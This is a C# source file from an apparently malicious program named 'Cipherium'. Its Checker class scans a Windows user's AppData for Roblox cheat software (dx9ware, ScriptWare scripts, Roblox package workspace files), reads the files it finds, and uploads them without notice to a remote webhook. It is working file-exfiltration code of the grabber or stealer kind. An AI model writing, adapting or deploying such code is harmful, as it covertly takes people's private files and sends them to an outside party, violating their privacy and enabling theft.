using System;
using System.IO;
using System.Threading;
using System.Windows.Forms;

namespace Cipherium.Core.Util.CheatUtil
{
    internal class Checker
    {
        public static string SendCheats()
        {
            string foundCheats = "";
            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dx9ware"))
            {
                foundCheats += "\ndx9ware";
                if (File.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dx9ware\\dx9ware.dll"))
                {
                    Webhook.Webhook.SendWithFile(Program.Hook, "fun", "Cipherium", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\dx9ware\\dx9ware.dll", "dx9ware.dll");
                    Thread.Sleep(1000);
                }

            }

            if (Directory.Exists(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ScriptWareScripts"))
            {
                foundCheats += "\nScriptWare";
                string combinedScripts = "";
                foreach (var file in Directory.GetFiles(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\ScriptWareScripts"))
                {
                    combinedScripts += $"{new FileInfo(file).Name}:\n\n{File.ReadAllText(file)}\n\n\n";
                }

                File.WriteAllText(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\scriptware_scripts.txt", combinedScripts);
                Webhook.Webhook.SendWithFile(Program.Hook, "fun", "Cipherium", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\cipherium\\scriptware_scripts.txt", "scriptware_scripts.txt");
                Thread.Sleep(1000);
            }

            foreach (var directory in Directory.GetDirectories(Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Packages"))
            {
                if (new DirectoryInfo(directory).FullName.Contains("ROBLOX"))
                {
                    if (Directory.Exists(directory + "\\AC"))
                    {
                        if (Directory.Exists(directory + "\\AC\\workspace"))
                        {
                            foreach (var dir in Directory.GetDirectories(directory + "\\AC\\workspace"))
                            {
                                foreach (var file in Directory.GetFiles(dir))
                                {
                                    if (File.ReadAllText(new FileInfo(file).FullName) != "")
                                    {
                                        Webhook.Webhook.SendWithFile(Program.Hook, "fun", "Cipherium", new FileInfo(file).FullName, new FileInfo(file).Name);
                                        Thread.Sleep(3000);
                                    }
                                }
                            }
                        }
                    }
                }
            }

            return foundCheats;
        }
    }
}
